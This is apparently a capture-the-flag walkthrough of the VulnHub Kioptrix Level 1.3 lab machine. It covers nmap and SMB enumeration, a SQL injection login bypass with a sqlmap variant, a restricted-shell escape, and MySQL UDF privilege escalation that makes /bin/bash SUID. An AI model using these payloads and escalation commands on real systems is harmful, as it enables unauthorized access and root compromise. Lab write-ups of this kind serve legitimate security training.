# Kioptrix: Level 1.3 (#4)

https://www.vulnhub.com/entry/kioptrix-level-13-4,25/

We do a netdiscover to find `http://192.168.1.94/`


```
root@kali:~# nmap -sV 192.168.1.94

Starting Nmap 7.60 ( https://nmap.org ) at 2017-09-30 02:26 BST
Nmap scan report for Unknown-00-0c-29-fb-b8-ca.home (192.168.1.94)
Host is up (0.00034s latency).
Not shown: 566 closed ports, 430 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:0C:29:FB:B8:CA (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 209.17 seconds
```
## SQL injection

We see that `enum4linux 192.168.1.94` gives us several usernames and we can `smbclient -L 192.168.1.94` to find any shared resources. We can then sql inject the website by using one of the following usernames and `1' or '1'='1` e.g. `john:1' or '1'='1`. We could have also used `sqlmap -u "http://192.168.1.94/checklogin.php" --dbms=MySQL  --data="myusername=username&mypassword=password" --dbs` Now we can ssh to it and find a restricted shell. We can break out of it by performing `echo os.system('/bin/bash')`.

## Privilege Escalation - MySQL UDF

Now in terms of the privilege escalation, when we check the files, we should check processes and check what is running under root. This could allow us to perform an exploit.

Note: `cat /var/www/checklogin.php` to find root password

```
mysql> use mysql;
mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
mysql> select sys_exec('chmod u+s /bin/bash');

or (we can give John admin privileges)

mysql> select sys_exec('usermod -a -G admin john'); 
```
